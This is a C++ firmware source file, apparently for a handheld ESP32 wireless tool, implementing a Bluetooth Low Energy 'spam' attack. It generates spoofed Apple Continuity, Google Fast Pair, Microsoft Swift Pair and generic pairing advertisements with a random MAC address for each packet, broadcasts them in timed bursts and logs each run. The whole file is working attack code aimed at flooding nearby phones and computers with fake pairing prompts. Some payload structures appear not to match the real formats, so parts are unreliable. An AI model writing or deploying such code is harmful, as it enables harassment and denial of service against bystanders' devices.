#include "ble_spam.h"
#include "config.h"
#include "rtc_clock.h"
#include "tx_arm.h"
#include <NimBLEDevice.h>
#include <LittleFS.h>

namespace BleSpam {

namespace {
volatile bool g_spamActive = false;
volatile uint32_t g_packetCount = 0;
NimBLEAdvertising *g_pAdvertising = nullptr;
}

void generateContinuityPayload(uint8_t *buf, uint8_t &len) {
    buf[0] = 0x0F;           // Continuity type
    buf[1] = 0x01;           // Length: 1 byte
    buf[2] = 0x02;           // Flags: 0x02 = general discoverable

    uint32_t seq = random(0xFFFFFFFF);
    buf[3] = (seq >> 24) & 0xFF;
    buf[4] = (seq >> 16) & 0xFF;
    buf[5] = (seq >> 8) & 0xFF;
    buf[6] = seq & 0xFF;

    len = 7;
}

void generateFastPairPayload(const String &ssid, uint8_t *buf, uint8_t &len) {
    buf[0] = 0x16;           // Google Fast Pair type
    buf[1] = 0xE1;           // Vendor ID: Google (0x00E1 LE)
    buf[2] = 0x00;           //

    uint16_t modelId = random(0x0001, 0xFFFF);
    buf[3] = (modelId >> 8) & 0xFF;
    buf[4] = modelId & 0xFF;

    uint8_t flags = 0x00;
    if (random(0, 2)) flags |= 0x04;  // discoverable
    if (random(0, 2)) flags |= 0x01;  // show UI indicator
    buf[5] = flags;

    len = 6;
}

void generateSwiftPairPayload(uint8_t *buf, uint8_t &len) {
    buf[0] = 0xFF;           // Microsoft beacon type
    buf[1] = 0x06;           // Microsoft
    buf[2] = 0x00;           // Microsoft

    uint16_t devType = random(0x0001, 0xFFFF);
    buf[3] = (devType >> 8) & 0xFF;
    buf[4] = devType & 0xFF;

    uint8_t subType = random(0x01, 0x05);
    buf[5] = subType;

    len = 6;
}

void generateGenericPairingPayload(uint8_t *buf, uint8_t &len) {
    buf[0] = 0x01;           // Generic flags
    buf[1] = 0x06;           // LE General Discoverable, BR/EDR Not Supported

    buf[2] = 0xFF;           // Manufacturer Specific Data
    uint16_t mfg = random(0x004C, 0x0400);
    buf[3] = mfg & 0xFF;
    buf[4] = (mfg >> 8) & 0xFF;

    for (int i = 5; i < 15; i++) {
        buf[i] = random(0x00, 0xFF);
    }

    len = 15;
}

void randomizeBLE_MAC(uint8_t *addr) {
    for (int i = 0; i < 6; i++) {
        addr[i] = random(0x00, 0xFF);
    }
    addr[0] &= 0xFE;  // ensure random private address (bit 0 = 0)
}

void logSpamActivity(const String &logFile, const SpamConfig &cfg, uint32_t packetsSent, uint32_t elapsedMs) {
    if (!LittleFS.exists(LOG_DIR)) {
        LittleFS.mkdir(LOG_DIR);
    }

    File f = LittleFS.open(logFile, "a");
    if (!f) return;

    String typeStr;
    switch (cfg.type) {
        case CONTINUITY:      typeStr = "Continuity"; break;
        case FAST_PAIR:       typeStr = "FastPair"; break;
        case SWIFT_PAIR:      typeStr = "SwiftPair"; break;
        case GENERIC_PAIRING: typeStr = "Generic"; break;
    }

    String line = RtcClock::isoTimestamp() + ",BLE_SPAM," + typeStr + ",";
    line += String(cfg.packetsPerSec) + "pps,";
    line += String(packetsSent) + " packets sent," + String(elapsedMs) + "ms";

    if (!cfg.customSSID.isEmpty()) {
        line += "," + cfg.customSSID;
    }

    f.println(line);
    f.close();
}

SpamResult spam(const SpamConfig &config) {
    SpamResult result = {false, 0, 0, "", ""};

    if (!TxArm::isArmed()) {
        result.error = "TX not armed (hold BACK button)";
        return result;
    }

    g_spamActive = true;
    g_packetCount = 0;

    String logFile = HANDSHAKE_CAPTURE_DIR;
    logFile += "/ble_spam.csv";

    uint32_t startTime = millis();
    uint32_t nextPacketTime = startTime;
    uint32_t packetInterval = 1000 / config.packetsPerSec;
    uint8_t currentChannel = config.targetChannel;

    uint8_t payload[31];
    uint8_t payloadLen = 0;

    while (g_spamActive && (millis() - startTime) < config.durationMs) {
        uint32_t now = millis();

        if (now >= nextPacketTime) {
            if (TxArm::isArmed()) {
                // Generate random BLE MAC
                uint8_t bleAddr[6];
                randomizeBLE_MAC(bleAddr);

                // Generate payload based on spam type
                switch (config.type) {
                    case CONTINUITY:
                        generateContinuityPayload(payload, payloadLen);
                        break;
                    case FAST_PAIR:
                        generateFastPairPayload(config.customSSID, payload, payloadLen);
                        break;
                    case SWIFT_PAIR:
                        generateSwiftPairPayload(payload, payloadLen);
                        break;
                    case GENERIC_PAIRING:
                        generateGenericPairingPayload(payload, payloadLen);
                        break;
                }

                // Setup NimBLE advertisement with payload
                if (!g_pAdvertising) {
                    g_pAdvertising = NimBLEDevice::getAdvertising();
                }

                NimBLEAdvertisementData advData;
                advData.setFlags(0x06);
                advData.addData(std::string((const char *)payload, payloadLen));

                g_pAdvertising->setAdvertisementData(advData);

                // Start advertising burst
                g_pAdvertising->start(0, nullptr, nullptr);
                delay(5);
                g_pAdvertising->stop();

                g_packetCount++;
                result.packetsSent++;
            } else {
                // TX disarmed, stop immediately
                g_spamActive = false;
                result.error = "TX disarmed during attack";
                break;
            }

            nextPacketTime += packetInterval;
        }

        delay(1);
    }

    g_spamActive = false;
    result.success = (result.packetsSent > 0);
    result.elapsedMs = millis() - startTime;
    result.logFile = logFile;

    if (result.success) {
        logSpamActivity(logFile, config, result.packetsSent, result.elapsedMs);
    }

    return result;
}

void stop() {
    g_spamActive = false;
    if (g_pAdvertising) {
        g_pAdvertising->stop();
    }
}

bool isActive() {
    return g_spamActive;
}

uint32_t getPacketCount() {
    return g_packetCount;
}

} // namespace BleSpam
